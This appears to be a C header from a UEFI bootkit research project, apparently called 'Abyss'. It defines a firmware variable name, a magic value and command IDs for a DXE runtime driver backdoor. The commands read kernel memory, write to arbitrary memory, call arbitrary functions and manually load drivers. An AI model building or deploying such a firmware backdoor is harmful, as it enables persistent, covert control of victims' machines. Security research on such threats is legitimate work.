// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Globals Operations
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>



// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------
// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------



#define MACRO_GLOBALSOPERATIONS_VARIABLE_NAME L"Abyss_TheMalwareGuardian_Benthic_drkrysSrng"
#define MACRO_GLOBALSOPERATIONS_COMMAND_MAGIC 0xBADC0DE


// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



/**
	* Enumerates the command operation codes used by the DXE Runtime Driver dispatcher. Each ID corresponds to a specific internal action like memory manipulation or code execution.
	*
	* NOTE:
	* - All symbolic IDs must remain unique.
	* - If any value is changed or reordered, update both userland and DXE driver accordingly.
	* - This enum must be synchronized between all communicating components.
**/
typedef enum _GLOBALS_OPERATIONS_COMMANDID
{
	// 100-series -> status
	GLOBALS_OPERATIONS_COMMANDID_OP_DRIVER_PRESENCE      = 100, // Echo "DXE Runtime Driver is alive"
	GLOBALS_OPERATIONS_COMMANDID_OP_GET_BUFFER_BOUNDS    = 101, // Return start/end of internal buffer

	// 200-series  ->  read
	GLOBALS_OPERATIONS_COMMANDID_OP_READ_MEMORY          = 200, // Copy kernel to user

	// 300-series  ->  write
	GLOBALS_OPERATIONS_COMMANDID_OP_WRITE_TAG            = 300, // Write predefined tag at offset 0
	GLOBALS_OPERATIONS_COMMANDID_OP_WRITE_IN_BUFFER      = 301, // Bounds-checked write into buffer
	GLOBALS_OPERATIONS_COMMANDID_OP_WRITE_RAW            = 302, // Unrestricted write anywhere

	// 400-series  ->  call
	GLOBALS_OPERATIONS_COMMANDID_OP_CALL_FAST            = 400, // Fastcall function pointer

	// 500-series  -> driver loader
	GLOBALS_OPERATIONS_COMMANDID_OP_DRIVER_ENTRY         = 500, // Invoke DriverEntry(fakeObj, regPath)

	/* Extend here … */
} GLOBALS_OPERATIONS_COMMANDID;



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
